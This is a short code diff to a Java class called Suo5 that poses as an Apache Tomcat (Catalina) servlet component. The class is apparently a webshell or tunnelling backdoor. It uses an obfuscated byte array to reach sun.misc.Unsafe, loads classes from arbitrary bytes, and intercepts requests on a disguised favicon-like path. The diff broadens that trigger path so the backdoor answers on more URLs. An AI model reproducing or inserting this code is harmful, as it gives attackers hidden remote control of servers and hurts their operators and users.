@@ -1,8 +1,6 @@
 package org.apache.catalina.servlets.sl;
 
 public class Suo5 {
-    private static final String pathPattern= "/faviconsuo";
-
     public static Class unsafedefine(byte[] bytes) throws Exception {
         java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
         field.setAccessible(true);
@@ -14,7 +12,7 @@ public class Suo5 {
     }
 
     public static void doService(Object obj, String url, String method, java.io.InputStream in) {
-        if (url.matches(pathPattern)) {
+        if (url.matches("/(.*)faviconsuo")) {
             java.util.Map objMap = (java.util.Map) obj;
             Object request = objMap.get("request");
             Object response = objMap.get("response");
